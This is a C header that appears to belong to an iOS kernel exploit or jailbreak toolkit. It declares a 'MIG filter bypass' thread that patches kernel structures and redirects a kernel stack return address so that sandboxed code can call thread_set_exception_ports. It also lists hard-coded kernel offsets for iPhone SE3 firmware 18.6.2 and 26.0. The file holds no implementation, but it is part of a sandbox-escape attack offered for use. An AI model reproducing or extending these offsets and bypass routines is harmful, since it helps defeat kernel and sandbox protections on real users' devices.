#pragma once
#include <stdio.h>
#include <stdint.h>

/*
 * MIG filter bypass thread — patches migLock, migSbxMsg and redirects
 * migKernelStackLR so that thread_set_exception_ports can be called
 * from inside the sandbox.
 *
 * Offsets below are device/firmware specific. Only a handful are known.
 * Add more per-device entries as needed.
 */

// iPhone SE3 / 18.6.2
#define KOFFSET_IPHONE_SE3_1862_MIG_LOCK             0xFFFFFFF00A8C0DA8
#define KOFFSET_IPHONE_SE3_1862_MIG_SBX_MSG          0xFFFFFFF00A8C0DC8
#define KOFFSET_IPHONE_SE3_1862_MIG_KERNEL_STACK_LR  0xFFFFFFF00A209560

// iPhone SE3 / 26.0
#define KOFFSET_IPHONE_SE3_260_MIG_LOCK              0xFFFFFFF00ACBDFB0
#define KOFFSET_IPHONE_SE3_260_MIG_SBX_MSG           0xFFFFFFF00ACBDFD0
#define KOFFSET_IPHONE_SE3_260_MIG_KERNEL_STACK_LR   0xFFFFFFF00A59A118

int  mig_bypass_init(uint64_t kernelSlide, uint64_t migLockOff,
                     uint64_t migSbxMsgOff, uint64_t migKernelStackLROff);
void mig_bypass_start(void);
void mig_bypass_resume(void);
void mig_bypass_pause(void);
void mig_bypass_monitor_threads(uint64_t thread1, uint64_t thread2);
void mig_bypass_stop(void);
